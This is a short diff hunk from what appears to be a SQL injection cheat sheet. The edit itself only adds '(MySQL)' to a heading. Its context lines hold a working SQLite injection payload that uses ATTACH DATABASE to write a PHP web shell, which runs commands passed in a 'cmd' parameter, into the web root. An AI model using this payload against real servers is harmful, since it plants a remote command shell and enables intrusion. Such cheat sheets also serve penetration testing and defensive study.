@@ -160,7 +160,7 @@ ATTACH DATABASE '/var/www/html/y.php' AS y;--
 CREATE TABLE y.p (dataz text);--
 INSERT INTO y.p (dataz) VALUES ('<? system($_GET[''cmd'']);?>');--
 ```  
-#### Alternatives to information_schema table
+#### Alternatives to information_schema table (MySQL)
 ```sql
 SELECT * FROM sys.x$schema_flattened_keys;
 ```
